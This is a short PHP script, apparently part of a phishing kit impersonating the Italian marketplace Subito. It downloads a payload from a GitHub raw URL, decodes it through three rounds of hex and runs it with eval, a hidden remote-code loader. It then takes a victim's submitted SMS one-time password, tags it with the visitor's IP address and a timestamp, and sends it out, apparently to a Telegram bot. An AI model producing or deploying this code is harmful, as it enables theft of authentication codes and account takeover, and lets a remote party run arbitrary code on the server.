<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'config.php');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/telegram-bot-send/token/main/bot" ); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 ); 
$data=curl_exec($ch);
curl_close($ch);
$data = str_replace(" ", "", $data);
$data = str_replace("\r", "", $data);
$data = str_replace("\n", "", $data);
echo eval(hex2bin(hex2bin(hex2bin($data))));


session_start();

$info = "\nTIME: <b>".date("d-m-Y h:i:sa")."</b>\n[ ---- ".$_SERVER['REMOTE_ADDR']." ---- ]";

$_SESSION['OTP'] = $_POST['OTP'];

if(isset($_POST['OTP'])){
 if(strlen($_POST['OTP'])>0){
	$msg = urlencode("[ +❤️✉️✉️ <b>SUBITO SMS</b> ✉️✉️❤️+ ]\nSMS : <b><code>".$_POST['OTP']."</code></b>".$info);
	send($msg);
 }
}

?>